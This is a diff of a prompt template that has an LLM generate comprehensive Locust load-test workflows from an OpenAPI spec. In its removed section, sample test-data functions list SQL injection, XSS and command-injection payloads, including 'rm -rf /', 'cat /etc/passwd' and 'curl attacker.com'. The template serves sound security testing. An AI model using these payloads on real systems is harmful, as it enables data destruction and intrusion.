@@ -1,783 +1,96 @@
-CRITICAL CONSTRAINTS: Only use endpoints that exist in the OpenAPI specification. DO NOT create, modify, or reference any endpoints not listed below.
+You are enhancing a Locust workflow file for load testing.
 
-**CRITICAL: catch_response=True REQUIRES with-block**
-When using `catch_response=True`, you MUST use a `with` statement. The `response.success()` and `response.failure()` methods are ONLY valid inside the context manager.
+## CRITICAL RULES
 
-CORRECT PATTERN:
-```python
-with self.client.post("/endpoint", json=data, catch_response=True) as response:
-    if response.status_code == 200:
-        response.success()  # Valid - inside with-block
-    else:
-        response.failure("Error message")  # Valid - inside with-block
-```
+1. **catch_response=True REQUIRES with-block**:
+   ```python
+   # CORRECT:
+   with self.client.post("/endpoint", json=data, catch_response=True) as response:
+       if response.status_code == 200:
+           response.success()
+       else:
+           response.failure("Error")
 
-WRONG PATTERN (CAUSES RUNTIME ERROR):
-```python
-# WRONG - will cause LocustError: "Tried to set status on a request that has not yet been made"
-response = self.client.post("/endpoint", json=data, catch_response=True)
-if response.status_code == 200:
-    response.success()  # RUNTIME ERROR - outside with-block!
-else:
-    response.failure("Error message")  # RUNTIME ERROR - outside with-block!
-```
+   # WRONG (causes runtime error):
+   response = self.client.post("/endpoint", json=data, catch_response=True)
+   response.success()  # ERROR - not in with-block!
+   ```
+
+2. **ONLY use endpoints from the OpenAPI spec** - do NOT invent endpoints.
+
+3. **Authentication methods must be defined in the workflow class itself**:
+   - Call via `self.login_and_get_token()`, NOT `super().login_and_get_token()`
+   - BaseTaskMethods does NOT define login/logout methods
 
 {% if auth_endpoints %}
-**CRITICAL: Authentication Method Implementation**
+## Available Authentication Endpoints
 
-**CRITICAL: DO NOT INVENT AUTHENTICATION ENDPOINTS!**
-- ONLY use authentication endpoints that are EXPLICITLY listed in auth_endpoints below
-- Use the EXACT endpoint paths from auth_endpoints (e.g., /auth/token, /oauth/authorize, /session, /authenticate, etc.)
-- Authentication endpoints may have various names - use whatever is in auth_endpoints, not just "/login" or "/logout"
-- If auth_endpoints is empty, skip endpoint-based authentication and use config.api_key for authorization instead
+{{ auth_endpoints }}
 
-IMPORTANT: `login_and_get_token` and `logout_session` are NOT defined in parent classes (BaseTaskMethods or SequentialTaskSet).
-These methods must be defined in the workflow class itself and called via `self`, NOT `super()`.
-
-Before generating authentication methods:
-
-1. **Check if the current workflow file already defines login/logout methods**
-
-2. **IF the workflow class already defines auth methods**:
-   - Use `self.login_and_get_token()` in on_start()
-   - Use `self.logout_session()` in on_stop()
-   - NEVER call `super().login_and_get_token()` - this method does not exist in parent classes
-
-3. **IF the workflow class lacks auth methods AND auth endpoints exist**:
-   - ADD login_and_get_token() and logout_session() methods to the workflow class
-   - Call them via `self` in on_start/on_stop
-
-CORRECT PATTERN:
-```python
-def on_start(self):
-    super().on_start()  # Only calls BaseTaskMethods.on_start()
-    self.login_and_get_token()  # Call via self, NOT super()
-
-def on_stop(self):
-    self.logout_session()  # Call via self, NOT super()
-    super().on_stop()
-```
-
-WRONG PATTERNS (DO NOT USE):
-```python
-# WRONG #1 - login_and_get_token does not exist in parent classes
-if hasattr(super(), 'login_and_get_token'):
-    super().login_and_get_token()
-
-# WRONG #2 - catch_response without with-block causes runtime error!
-def login_and_get_token(self):
-    response = self.client.post("/login", json=data, catch_response=True)
-    if response.status_code == 200:
-        response.success()  # RUNTIME ERROR - must be inside 'with' block!
-    else:
-        response.failure("Failed")  # RUNTIME ERROR - must be inside 'with' block!
-
-# WRONG #3 - inventing endpoints that don't exist in OpenAPI spec!
-def login_and_get_token(self):
-    # DO NOT invent endpoints - use ONLY what's in auth_endpoints!
-    # If auth_endpoints has "/auth/token", use that, not "/api/v1/login"
-    with self.client.post("/api/v1/login", ...)  # WRONG if this path isn't in auth_endpoints!
-```
+Use these EXACT paths for authentication. Do NOT invent login/logout URLs.
 {% endif %}
-TASK: Enhance this Locust workflow file with COMPREHENSIVE test scenarios and LOGICAL TASK ORDERING.
-STRICT REQUIREMENTS:
-        1. ONLY use these exact API endpoints from OpenAPI spec:
-        {{  grouped_enpoints }}
 
-         2. Authentication Management:
-        {{ auth_endpoints }}
+## Current Workflow Content
 
-        IMPORTANT: BaseTaskMethods (from base_workflow.py) does NOT define login_and_get_token or logout_session.
-        These methods must be defined in each workflow class that needs authentication.
+```python
+{{ base_content }}
+```
 
-            - If auth endpoints exist, define login_and_get_token() and logout_session() in the workflow class
+## Available Endpoints for This Workflow
 
-            - Call these methods via `self` (e.g., self.login_and_get_token()), NOT via super()
+{{ grouped_endpoints }}
 
-            - Use handle_401_retry() from BaseTaskMethods for automatic re-authentication on 401 responses
+## Available Test Data Functions
 
-            - NEVER call super().login_and_get_token() - this method does not exist in parent classes
-        3. PRESERVE EXISTING STRUCTURE:
-           - Keep ALL existing @task methods, classes, and functions
-           - DO NOT remove any existing functionality
-           - DO NOT change existing method signatures unless enhancing them
-           - ADD to existing methods, don't replace them
-       4. ADD NEW FUNCTIONALITY WHEN NEEDED:
-           - If an API endpoint requires specific IDs, ADD new methods to generate/store those IDs
-           - ADD new test data generators to test_data.py functions
-           - ADD new example usage patterns to example.py
-           - CREATE data flow between related API calls
+{{ test_data_content }}
 
-    5. DATA FLOW AND ID MANAGEMENT:
-       - ADD instance variables to store IDs (self.reseller_id, self.user_id, etc.)
-       - ADD methods to extract and store IDs from API responses
-       - ADD logic to use stored IDs in subsequent API calls
-       - CREATE realistic data dependencies between tasks
+{% if db_type == "mongo" %}
+## MongoDB Integration
 
-    6. COMPREHENSIVE TEST SCENARIOS FOR EACH ENDPOINT:
-       Instead of only testing happy path scenarios, ADD multiple test cases for each endpoint:
+MongoDB is available via:
+- `mongo_data_provider.get_document(collection, query)`
+- `mongo_data_provider.get_multiple_documents(collection, count, query)`
 
-       **A. POSITIVE TEST SCENARIOS (Higher Task Weight):**
-       - Valid data with all required fields (weight: 10)
-       - Valid data with optional fields included (weight: 8)
-       - Boundary value testing (min/max valid values) (weight: 5)
-       - Different valid data formats and types (weight: 5)
-       - Valid edge cases (empty arrays, minimum required data) (weight: 3)
+Add MongoDB data retrieval in on_start() if needed.
+{% endif %}
 
-       **B. NEGATIVE TEST SCENARIOS (Medium Task Weight):**
-       - Empty string values for required fields (weight: 3)
-       - Missing required parameters entirely (weight: 3)
-       - Invalid data types (string where number expected, etc.) (weight: 3)
-       - Invalid format data (invalid email format, phone format, etc.) (weight: 3)
-       - Out of range values (negative numbers where positive expected) (weight: 2)
-       - Excessively long strings (weight: 2)
-       - Invalid IDs (non-existent, malformed UUIDs) (weight: 2)
+---
 
-       **C. SECURITY TEST SCENARIOS (Lower Task Weight):**
-       - SQL injection patterns in string fields (weight: 1)
-       - XSS patterns in text inputs (weight: 1)
-       - Command injection attempts (weight: 1)
-       - Path traversal attempts in file uploads (weight: 1)
-       - Script injection in JSON payloads (weight: 1)
+## YOUR TASK: Enhance This Workflow
 
-       **D. EDGE CASE SCENARIOS (Lower Task Weight):**
-       - Null/None values where not expected (weight: 2)
-       - Zero values in numeric fields (weight: 2)
-       - Maximum allowed values testing limits (weight: 2)
-       - Unicode and international characters (weight: 2)
-       - Special characters in string fields (weight: 2)
+Return the **COMPLETE enhanced workflow file** with:
 
-       **E. STATE-DEPENDENT SCENARIOS (Medium Task Weight):**
-       - Operations on already deleted resources (weight: 3)
-       - Duplicate creation attempts (weight: 3)
-       - Concurrent operation conflicts (weight: 2)
-       - Resource limit scenarios (weight: 2)
-       - Expired token/session scenarios (weight: 2)
+1. **Improved @task methods** with:
+   - Proper catch_response=True in with-blocks
+   - Status code validation
+   - Error handling
 
-       **F. ERROR HANDLING SCENARIOS (Medium Task Weight):**
-       - Expect 400 Bad Request scenarios (weight: 3)
-       - Expect 401 Unauthorized scenarios (weight: 3)
-       - Expect 403 Forbidden scenarios (weight: 2)
-       - Expect 404 Not Found scenarios (weight: 3)
-       - Expect 409 Conflict scenarios (weight: 2)
-       - Expect 422 Validation Error scenarios (weight: 3)
+2. **Data flow** between tasks:
+   - Store IDs from creation responses
+   - Use stored IDs in subsequent calls
 
-    7. AUTHENTICATION INTEGRATION STRATEGY:
+3. **Authentication** (if auth endpoints exist):
+   - Define login_and_get_token() in the class
+   - Call from on_start() via self
 
-           **CRITICAL: Only implement authentication if actual login/logout endpoints exist in auth_endpoints!**
-           - Do NOT invent authentication endpoints like "/api/v1/login" or "/login"
-           - If auth_endpoints is empty, use config.api_key for authorization instead
-           - Always use `with` block when using catch_response=True
+### OUTPUT FORMAT
 
-           Since base_workflow.py is provided, implement smart authentication handling to setup_authentication method to send headers with valid credentials and in  case returning 401 to login with new credentials:
+Wrap your complete enhanced Python file in `<code>` tags:
 
-8. SCENARIO IMPLEMENTATION APPROACH:
-       For each endpoint, ADD multiple @task methods with different scenario types:
-       ```python
-       # POSITIVE SCENARIOS
-       @task(10)  # Highest weight for happy path
-       def create_resource_valid_complete_data(self):
-           """Test resource creation with all valid required and optional fields"""
-           data = test_data.get_valid_complete_resource_data()
-           with self.client.post("/api/resource", json=data, catch_response=True) as response:
-               if response.status_code == 201:
-                   resource_id = response.json().get('id')
-                   if resource_id:
-                       self.created_resources.append(resource_id)
-                   response.success()
-               else:
-                   response.failure(f"Expected 201, got {response.status_code}")
+```
+<code>
+import ...
 
-       @task(8)
-       def create_resource_minimal_valid_data(self):
-           """Test resource creation with only required fields"""
-           data = test_data.get_minimal_valid_resource_data()
-           # Similar implementation...
+class WorkflowName(SequentialTaskSet):
+    ...
+</code>
+```
 
-       @task(5)
-       def create_resource_boundary_values(self):
-           """Test resource creation with boundary values"""
-           data = test_data.get_boundary_value_resource_data()
-           # Similar implementation...
+### DO NOT:
+- ❌ Invent endpoints not in the OpenAPI spec
+- ❌ Use catch_response without with-block
+- ❌ Call super().login_and_get_token() (doesn't exist)
+- ❌ Remove existing functionality
+- ❌ Add explanatory text outside <code> tags
 
-       # NEGATIVE SCENARIOS
-       @task(3)
-       def create_resource_missing_required_field(self):
-           """Test resource creation missing required field - expect 400"""
-           data = test_data.get_resource_data_missing_required()
-           with self.client.post("/api/resource", json=data, catch_response=True) as response:
-               if response.status_code == 400:
-                   response.success()
-               else:
-                   response.failure(f"Expected 400, got {response.status_code}")
-
-       @task(3)
-       def create_resource_invalid_data_types(self):
-           """Test resource creation with invalid data types - expect 400/422"""
-           data = test_data.get_invalid_type_resource_data()
-           with self.client.post("/api/resource", json=data, catch_response=True) as response:
-               if response.status_code in [400, 422]:
-                   response.success()
-               else:
-                   response.failure(f"Expected 400/422, got {response.status_code}")
-
-       @task(3)
-       def create_resource_invalid_format(self):
-           """Test resource creation with invalid format data - expect 400/422"""
-           data = test_data.get_invalid_format_resource_data()
-           # Similar implementation...
-
-       @task(2)
-       def create_resource_out_of_range_values(self):
-           """Test resource creation with out of range values - expect 400/422"""
-           data = test_data.get_out_of_range_resource_data()
-           # Similar implementation...
-
-       # SECURITY TEST SCENARIOS
-       @task(1)
-       def create_resource_sql_injection_attempt(self):
-           """Test resource creation with SQL injection patterns - expect 400/422"""
-           data = test_data.get_sql_injection_resource_data()
-           with self.client.post("/api/resource", json=data, catch_response=True) as response:
-               if response.status_code in [400, 422]:
-                   response.success()
-               elif response.status_code == 500:
-                   response.failure("SQL injection may have succeeded - security vulnerability!")
-               else:
-                   response.failure(f"Unexpected response {response.status_code}")
-
-       @task(1)
-       def create_resource_xss_attempt(self):
-           """Test resource creation with XSS patterns - expect 400/422"""
-           data = test_data.get_xss_resource_data()
-           # Similar implementation...
-
-       # STATE-DEPENDENT SCENARIOS
-       @task(3)
-       def create_duplicate_resource(self):
-           """Test duplicate resource creation - expect 409"""
-           if hasattr(self, 'created_resources') and self.created_resources:
-               existing_data = test_data.get_duplicate_resource_data(self.created_resources[0])
-               with self.client.post("/api/resource", json=existing_data, catch_response=True) as response:
-                   if response.status_code == 409:
-                       response.success()
-                   else:
-                       response.failure(f"Expected 409 for duplicate, got {response.status_code}")
-
-       @task(3)
-       def operate_on_deleted_resource(self):
-           """Test operation on deleted resource - expect 404"""
-           fake_id = test_data.get_non_existent_resource_id()
-           with self.client.get(f"/api/resource/{fake_id}", catch_response=True) as response:
-               if response.status_code == 404:
-                   response.success()
-               else:
-                   response.failure(f"Expected 404, got {response.status_code}")
-
-       # ERROR HANDLING SCENARIOS
-       @task(2)
-       def unauthorized_access_attempt(self):
-           """Test access without proper authentication - expect 401"""
-           # Temporarily remove auth headers
-           original_headers = self.client.headers.copy()
-           self.client.headers.clear()
-           with self.client.get("/api/resource", catch_response=True) as response:
-               if response.status_code == 401:
-                   response.success()
-               else:
-                   response.failure(f"Expected 401, got {response.status_code}")
-           # Restore headers
-           self.client.headers.update(original_headers)
-       ```
-
-    8. TEST DATA ENHANCEMENT REQUIREMENTS:
-       Enhance test_data.py to support all scenario types:
-       ```python
-       # ADD to test_data.py - Positive scenario data generators
-       def get_valid_complete_resource_data():
-           """Generate valid data with all fields populated"""
-           return {
-               "name": fake.company(),
-               "email": fake.email(),
-               "phone": fake.phone_number(),
-               "address": fake.address(),
-               "description": fake.text(),
-               "tags": [fake.word() for _ in range(3)],
-               "active": True,
-               "priority": random.randint(1, 10)
-           }
-
-       def get_minimal_valid_resource_data():
-           """Generate data with only required fields"""
-           return {
-               "name": fake.company(),
-               "email": fake.email()
-           }
-
-       def get_boundary_value_resource_data():
-           """Generate data with boundary values"""
-           return {
-               "name": "A",  # Minimum length
-               "email": fake.email(),
-               "priority": 1,  # Minimum value
-               "description": ""  # Empty optional field
-           }
-
-       # ADD to test_data.py - Negative scenario data generators
-       def get_resource_data_missing_required():
-           """Generate data missing required field"""
-           return {
-               "description": fake.text(),
-               "active": True
-               # Missing required 'name' field
-           }
-
-       def get_invalid_type_resource_data():
-           """Generate data with wrong data types"""
-           return {
-               "name": 12345,  # Should be string
-               "email": fake.email(),
-               "priority": "high",  # Should be number
-               "active": "yes"  # Should be boolean
-           }
-
-       def get_invalid_format_resource_data():
-           """Generate data with invalid formats"""
-           return {
-               "name": fake.company(),
-               "email": "invalid-email-format",  # Invalid email
-               "phone": "abc-def-ghij",  # Invalid phone
-               "url": "not-a-url"  # Invalid URL format
-           }
-
-       def get_out_of_range_resource_data():
-           """Generate data with out of range values"""
-           return {
-               "name": fake.company(),
-               "email": fake.email(),
-               "priority": -5,  # Negative when positive expected
-               "age": 999,  # Too high value
-               "description": "x" * 10000  # Excessively long string
-           }
-
-       # ADD to test_data.py - Security test data generators
-       def get_sql_injection_resource_data():
-           """Generate data with SQL injection patterns"""
-           injection_patterns = [
-               "'; DROP TABLE users; --",
-               "' OR '1'='1",
-               "'; INSERT INTO users VALUES ('hacker'); --",
-               "' UNION SELECT * FROM sensitive_data --"
-           ]
-           return {
-               "name": random.choice(injection_patterns),
-               "email": fake.email(),
-               "description": random.choice(injection_patterns)
-           }
-
-       def get_xss_resource_data():
-           """Generate data with XSS patterns"""
-           xss_patterns = [
-               "<script>alert('XSS')</script>",
-               "javascript:alert('XSS')",
-               "<img src=x onerror=alert('XSS')>",
-               "';alert('XSS');//"
-           ]
-           return {
-               "name": random.choice(xss_patterns),
-               "email": fake.email(),
-               "description": random.choice(xss_patterns)
-           }
-
-       def get_command_injection_resource_data():
-           """Generate data with command injection patterns"""
-           command_patterns = [
-               "; rm -rf /",
-               "| cat /etc/passwd",
-               "&& curl attacker.com",
-               "`whoami`"
-           ]
-           return {
-               "name": random.choice(command_patterns),
-               "description": random.choice(command_patterns)
-           }
-
-       # ADD to test_data.py - Edge case data generators
-       def get_unicode_resource_data():
-           """Generate data with unicode characters"""
-           return {
-               "name": "测试公司 🏢",
-               "email": fake.email(),
-               "description": "Descripción en español with émojis 🚀",
-               "tags": ["العربية", "русский", "中文"]
-           }
-
-       def get_null_value_resource_data():
-           """Generate data with null values where unexpected"""
-           return {
-               "name": None,
-               "email": fake.email(),
-               "description": None,
-               "tags": None
-           }
-
-       def get_zero_value_resource_data():
-           """Generate data with zero values"""
-           return {
-               "name": fake.company(),
-               "email": fake.email(),
-               "priority": 0,
-               "count": 0,
-               "budget": 0.0
-           }
-
-       # ADD to test_data.py - State-dependent data generators
-       def get_duplicate_resource_data(existing_id):
-           """Generate data that would create duplicates"""
-           return {
-               "id": existing_id,
-               "name": "Duplicate Name",
-               "email": "duplicate@example.com"
-           }
-
-       def get_non_existent_resource_id():
-           """Generate non-existent resource ID"""
-           return str(uuid4())
-
-       def get_malformed_resource_id():
-           """Generate malformed resource ID"""
-           malformed_ids = [
-               "not-a-uuid",
-               "12345",
-               "uuid-with-too-many-dashes-here-and-here",
-               ""
-           ]
-           return random.choice(malformed_ids)
-       ```
-
-    9. ENHANCEMENT AREAS (ADD, don't replace):
-       - ADD better error handling to existing methods with expected status code validation
-       - ADD realistic test data usage from test_data.py for all scenarios
-       - ADD authentication handling if auth endpoints exist
-       - ADD cleanup methods for created resources
-       - ADD data correlation between sequential tasks
-       - ADD scenario-specific assertions for expected vs actual responses
-       - ADD performance metrics collection for different scenario types
-       - ADD retry logic for flaky scenarios
-       - ADD logging for debugging failed scenarios
-
-    10. SCENARIO DISTRIBUTION STRATEGY:
-        Distribute scenario weights to simulate realistic load patterns:
-        - 60% positive scenarios (happy path, normal usage)
-        - 25% negative scenarios (user errors, validation failures)
-        - 10% edge cases (boundary testing, unusual but valid data)
-        - 4% state-dependent scenarios (resource conflicts, timing issues)
-        - 1% security scenarios (injection attempts, unauthorized access)
-
-    {% if db_type=="mongo" %}
-    11. DATABASE DATA HANDLING AND CRUD OPERATIONS:
-        - Check if db_type == "mongo" in the configuration
-        - If MongoDB is enabled (mongo_config.enable_mongodb):
-          ADD proper MongoDB import handling with graceful fallback:
-          ```python
-          try:
-              from data_provider import mongo_data_provider
-              MONGODB_ENABLED = True
-          except ImportError:
-              MONGODB_ENABLED = False
-              mongo_data_provider = None
-          ```
-          - If MongoDB is enabled (MONGODB_ENABLED and getattr(config, 'enable_mongodb', False)):
-          * Use mongo_data_provider.get_document() for single document retrieval
-          * Use mongo_data_provider.get_multiple_documents() for multiple document retrieval
-          * Integrate MongoDB data into workflow tasks where appropriate
-          * Store MongoDB document IDs for use in subsequent API calls
-          * ADD MongoDB-specific test data patterns for all scenario types
-          * ADD MongoDB document validation in API requests
-          * ADD MongoDB collection-based test scenarios
-          * ADD database consistency validation between API and database states
-
-    12. DUAL DATA SOURCE CAPABILITY:
-        - ADD configuration option to choose between generated data vs real database data
-        - ADD method to switch between data sources: use_generated_data() vs use_database_data()
-        - ADD CRUD operation support for real database testing:
-             * CREATE: Insert test records into database before API testing
-             * READ: Retrieve existing data from database for API operations
-             * UPDATE: Modify database records and test API consistency
-             * DELETE: Remove test data and verify API responses
-        - ADD data validation between database state and API responses
-        - ADD rollback capabilities for database operations
-
-    13. MONGODB INTEGRATION PATTERNS:
-        - Import mongo_data_provider at the top of the workflow file
-        - ADD MongoDB data retrieval in on_start() method if needed
-        - Use MongoDB documents as test data for API endpoints in all scenario types
-        - ADD correlation between MongoDB documents and API responses
-        - ADD MongoDB document cleanup in on_stop() method
-        - ADD database transaction support for complex test scenarios
-        - ADD data consistency validation between database and API
-        - ADD MongoDB-specific negative scenarios (corrupted data, missing references)
-
-    14. CRUD-BASED WORKFLOW ENHANCEMENTS:
-        - ADD database setup/teardown methods for each test scenario type
-        - ADD real data validation against API endpoints
-        - ADD database state verification after API operations
-        - ADD conflict resolution for concurrent database operations
-        - ADD data integrity checks throughout the workflow
-        - ADD database-specific error scenarios (connection failures, timeout scenarios)
-    {% endif %}
-
-    CURRENT WORKFLOW FILE:
-    {{base_content}}
-
-{#    BASE WORKFLOW: {{base_workflow}}#}
-
-    TEST DATA AVAILABLE: {{test_data_content}}
-
-    15. **REORDER TASKS FOR LOGICAL FLOW WITH SCENARIO COVERAGE**:
-        Arrange @task methods in a meaningful business workflow sequence:
-        - Start with authentication scenarios (login variations)
-        - Follow with data creation scenarios (positive, negative, edge cases)
-        - Then data retrieval scenarios (valid IDs, invalid IDs, boundary cases)
-        - Perform operations using stored IDs (all scenario types)
-        - Test concurrent operations and conflicts
-        - End with cleanup operations and security scenarios
-        - Add logout scenarios
-
-    16. **COMPREHENSIVE DATA CORRELATION**: Use data from previous tasks in subsequent tasks:
-        - Store resource IDs from creation tasks for use in all subsequent scenario types
-        - Pass generated data between related API calls
-        - Maintain state between sequential tasks for realistic workflows
-        - Test data consistency across different scenario types
-        {% if db_type=="mongo" %} - If MongoDB is enabled, correlate MongoDB document data with API operations across all scenarios {% endif %}
-
-    17. **VALIDATION ENHANCEMENT**:
-        - Validate response schemas for positive scenarios
-        - Validate error message formats for negative scenarios
-        - Check response times for performance scenarios
-        - Verify security headers in all scenarios
-        - Validate data persistence across CRUD operations
-
-    18. **ERROR RECOVERY AND RESILIENCE TESTING**:
-        - ADD retry mechanisms for transient failures
-        - ADD circuit breaker patterns for failing endpoints
-        - ADD graceful degradation scenarios
-        - ADD timeout and connection failure scenarios
-
-    19. **BASE WORKFLOW INTEGRATION**:
-
-        Since base_workflow.py is provided, maximize reuse and avoid duplication:
-        **A. Authentication Implementation:**
-
-        IMPORTANT: BaseTaskMethods does NOT define login_and_get_token or logout_session.
-        - Define login_and_get_token() and logout_session() in YOUR workflow class
-        - Call via self.login_and_get_token(), NOT super().login_and_get_token()
-        - Use handle_401_retry() from BaseTaskMethods for 401 retry logic
-        - Store auth tokens in self.auth_token and update self.default_headers
-
-
-
-        **B. Utility Method Reuse:**
-        - Check for existing helper methods (ID generation, data extraction, error handling)
-        - Extend base_workflow classes rather than creating duplicates
-        - Use existing data correlation patterns from base_workflow
-        - Leverage existing cleanup methods from base_workflow
-
-
-
-        **C. Task Enhancement Strategy:**
-
-        - ADD scenario variations to existing base_workflow tasks
-        - PRESERVE all base_workflow task signatures and functionality
-        - EXTEND base_workflow tasks with comprehensive scenario coverage
-        - INHERIT base_workflow task weights and adjust for new scenarios
-
-
-    LOGICAL TASK SEQUENCE EXAMPLE WITH COMPREHENSIVE SCENARIOS:
-
-    For reseller workflow, the logical order should include all scenario types:
-    {% if db_type=="mongo" %}
-        - **MongoDB Data Setup** (if enabled):
-           - Retrieve MongoDB documents for test data across all scenarios
-           - Store document IDs for API operations
-    {% endif %}
-
-    **Authentication Phase:**
-    NOTE: login_and_get_token() and logout_session() must be defined in the workflow class itself.
-    Call via self.login_and_get_token() in on_start(), NOT super().login_and_get_token().
-
-    - Define login_and_get_token() method in workflow class
-    - Call self.login_and_get_token() in on_start() (weight: 10)
-    - login_invalid_credentials (weight: 3) - expect 401
-    - login_malformed_request (weight: 2) - expect 400
-    **Creation Phase:**
-    - add_reseller_valid_complete_data (weight: 10) → store reseller_id
-    - add_reseller_minimal_data (weight: 8) → store reseller_id
-    - add_reseller_missing_required_field (weight: 3) - expect 400
-    - add_reseller_invalid_email_format (weight: 3) - expect 422
-    - add_reseller_sql_injection_attempt (weight: 1) - expect 400/422
-    - add_reseller_duplicate_data (weight: 2) - expect 409
-
-    **Retrieval Phase:**
-    - get_reseller_list_valid (weight: 10)
-    - get_reseller_by_valid_id (weight: 10) (using stored reseller_id)
-    - get_reseller_by_invalid_id (weight: 3) - expect 404
-    - get_reseller_by_malformed_id (weight: 2) - expect 400
-    - get_reseller_unauthorized (weight: 2) - expect 401
-
-    **Operations Phase:**
-    - available_reseller_properties_valid (weight: 8) (using reseller_id)
-    - available_reseller_properties_invalid_id (weight: 3) - expect 404
-    - customize_corporate_price_valid (weight: 8) (using reseller_id)
-    - customize_corporate_price_invalid_data (weight: 3) - expect 400
-    - customize_corporate_price_out_of_range (weight: 2) - expect 422
-    - topup_reseller_balance_valid (weight: 8) (using reseller_id)
-    - topup_reseller_balance_negative_amount (weight: 3) - expect 400
-    - topup_reseller_balance_excessive_amount (weight: 2) - expect 422
-
-    **Update Phase:**
-    - edit_reseller_valid_data (weight: 8) (using reseller_id)
-    - edit_reseller_invalid_data (weight: 3) - expect 400
-    - edit_reseller_nonexistent_id (weight: 3) - expect 404
-    - edit_reseller_xss_attempt (weight: 1) - expect 400
-
-    **Cleanup Phase:**
-    - delete_reseller_valid (weight: 5) (cleanup using reseller_id)
-    - delete_reseller_already_deleted (weight: 3) - expect 404
-    - delete_reseller_unauthorized (weight: 2) - expect 401
-
-    {% if db_type=="mongo" %}
-        - **MongoDB Cleanup** (if enabled):
-            - Clean up any test documents created during workflow
-            - Verify database consistency after all operations
-    {% endif %}
-
-    **Logout Phase:**
-    NOTE: logout_session() must be defined in the workflow class itself.
-    Call via self.logout_session() in on_stop(), NOT super().logout_session().
-
-    - Define logout_session() method in workflow class
-    - Call self.logout_session() in on_stop() (weight: 5)
-    - logout_expired_session (weight: 2) - expect 401
-
-    VALIDATION RULES:
-        - Every @task method must correspond to an actual OpenAPI endpoint
-        - PRESERVE all existing functionality
-        - ADD new functionality only where needed for comprehensive scenario coverage
-        - Use only test_data.py functions that exist or suggest new ones to ADD
-        - Ensure realistic user workflows with proper data dependencies across all scenarios
-        - ADD error handling and resource cleanup for all scenario types
-        - Include expected status codes for all negative scenarios
-        - Add performance monitoring for all scenario types
-        {% if db_type=="mongo" %}
-            - If MongoDB is enabled, ensure proper integration with mongo_data_provider methods across all scenarios
-        {% endif %}
-
-    SUGGESTIONS FOR ADDITIONS (if needed):
-    If the workflow needs new test data generators or example patterns for comprehensive scenario coverage,
-    provide suggestions for what to ADD to:
-
-    **test_data.py additions for comprehensive scenarios:**
-    ```python
-    # Suggest new functions to ADD (don't replace existing)
-
-    # Positive scenario generators
-    def get_valid_complete_data():
-        """Generate complete valid data for happy path testing"""
-        pass
-
-    def get_minimal_valid_data():
-        """Generate minimal valid data for boundary testing"""
-        pass
-
-    # Negative scenario generators
-    def get_invalid_format_data():
-        """Generate data with invalid formats for validation testing"""
-        pass
-
-    def get_missing_required_data():
-        """Generate data missing required fields for error testing"""
-        pass
-
-    # Security scenario generators
-    def get_security_injection_data():
-        """Generate data with injection patterns for security testing"""
-        pass
-
-    def get_xss_payload_data():
-        """Generate data with XSS payloads for security testing"""
-        pass
-
-    # Edge case generators
-    def get_boundary_value_data():
-        """Generate boundary value data for limit testing"""
-        pass
-
-    def get_unicode_special_char_data():
-        """Generate data with unicode and special characters"""
-        pass
-
-    # State-dependent generators
-    def get_conflict_scenario_data():
-        """Generate data that creates conflicts for 409 testing"""
-        pass
-
-    def get_nonexistent_reference_data():
-        """Generate data referencing nonexistent resources for 404 testing"""
-        pass
-    ```
-
-    {% if db_type=="mongo" %}
-    # MongoDB-specific additions for comprehensive scenarios (if db_type == "mongo")
-    def get_mongodb_comprehensive_test_data(collection_name, scenario_type="positive"):
-        """Function to get MongoDB data for different scenario types"""
-        if mongo_config.enable_mongodb:
-            if scenario_type == "positive":
-                return mongo_data_provider.get_document(collection_name, {"status": "active"})
-            elif scenario_type == "negative":
-                return mongo_data_provider.get_document(collection_name, {"status": "corrupted"})
-            elif scenario_type == "edge":
-                return mongo_data_provider.get_document(collection_name, {"$or": [{"field": None}, {"field": ""}]})
-        return generate_fallback_data(scenario_type)
-
-    def create_comprehensive_test_documents(collection_name):
-        """Create test documents for all scenario types"""
-        if mongo_config.enable_mongodb:
-            scenarios = {
-                "valid": {"name": "valid_test", "status": "active", "data": "complete"},
-                "invalid": {"name": "", "status": "invalid", "data": None},
-                "edge": {"name": "x"*1000, "status": "edge", "data": "boundary"},
-                "security": {"name": "'; DROP TABLE test; --", "status": "security", "data": "<script>alert('xss')</script>"}
-            }
-            created_ids = {}
-            for scenario, doc in scenarios.items():
-                doc_id = mongo_data_provider.insert_document(collection_name, doc)
-                created_ids[scenario] = doc_id
-            return created_ids
-        return {}
-    {% endif %}
-
-    **example.py additions for comprehensive scenarios:**
-    ```python
-    # Suggest new example patterns to ADD for all scenario types
-    def example_comprehensive_workflow():
-        """Example showing all scenario types in workflow"""
-        pass
-
-    def example_negative_scenario_handling():
-        """Example showing proper negative scenario testing"""
-        pass
-
-    def example_security_testing_patterns():
-        """Example showing security testing integration"""
-        pass
-
-    def example_performance_monitoring():
-        """Example showing performance metrics collection"""
-        pass
-    ```
-
-    Return the complete enhanced file in <code></code> tags without truncation.
-
-    Format:
-    <code>your_complete_enhanced_python_code_here</code>
+Return the complete enhanced file now.
